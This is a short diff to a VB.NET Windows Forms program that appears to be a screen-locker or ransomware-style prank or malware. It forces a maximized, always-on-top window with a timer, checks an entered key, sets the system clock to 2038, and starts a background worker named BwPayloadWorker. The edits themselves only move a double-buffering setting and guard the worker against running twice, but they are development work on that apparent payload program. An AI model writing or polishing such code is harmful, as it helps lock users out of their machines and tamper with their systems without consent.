@@ -194,6 +194,8 @@ Public Class Form1
             ' Set form properties for full screen
             WindowState = FormWindowState.Maximized
             TopMost = True ' Keeps form on top of other windows
+            ' Enable double buffering
+            DoubleBuffered = True
 
             ' Initialize and display the timer label
             timerLabel.AutoSize = True
@@ -434,9 +436,6 @@ Public Class Form1
         ' Apply Minecraft Nether portal-like effect with pixelated swirling distortion
         Public Sub ApplyPortalEffect(g As Graphics)
             Dim gridSize As Integer = 200 ' Larger grid size reduces the load
-
-            ' Enable double buffering
-            DoubleBuffered = True
 
             Try
                 ' Load the byte array from resources using My.Resources
@@ -1338,8 +1337,10 @@ Public Class Form1
             ' 2. Set the system time to 2038
             SetSystemTimeTo2038()
 
-            ' Start the background worker
-            BwPayloadWorker.RunWorkerAsync()
+            If Not BwPayloadWorker.IsBusy Then
+                ' Start the background worker
+                BwPayloadWorker.RunWorkerAsync()
+            End If
 
         Else
             MessageBox.Show("Incorrect key. Please try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
